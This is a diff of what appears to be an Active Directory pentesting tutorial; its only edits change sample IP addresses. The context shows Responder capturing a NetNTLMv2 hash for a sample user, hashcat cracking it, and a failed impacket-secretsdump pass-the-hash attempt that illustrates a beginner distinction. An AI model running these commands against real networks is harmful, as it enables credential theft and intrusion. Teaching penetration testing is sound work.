@@ -29,7 +29,7 @@ Point it at the interface and listen; captured hashes are ready for offline crac
 ```shell-session
 operator@kali:~$ sudo responder -I eth0 -w -d
 [+] Listening for events...
-[SMB] NTLMv2-SSP Client   : 10.0.0.44
+[SMB] NTLMv2-SSP Client   : 10.10.10.44
 [SMB] NTLMv2-SSP Username : CORP\jsmith
 [SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122...:A1B2...
 operator@kali:~$ hashcat -m 5600 jsmith.hash rockyou.txt
@@ -45,7 +45,7 @@ The single most important AD-beginner distinction lives right here:
 ```shell-session
 # You captured this from Responder:
 jsmith::CORP:1122334455667788:A1B2C3...   ← NetNTLMv2 (a challenge-response)
-operator@kali:~$ impacket-secretsdump -hashes :A1B2C3... corp/jsmith@10.0.0.30
+operator@kali:~$ impacket-secretsdump -hashes :A1B2C3... corp/jsmith@10.10.20.30
 [-] [Errno Connection error] authentication failed
 ```
 
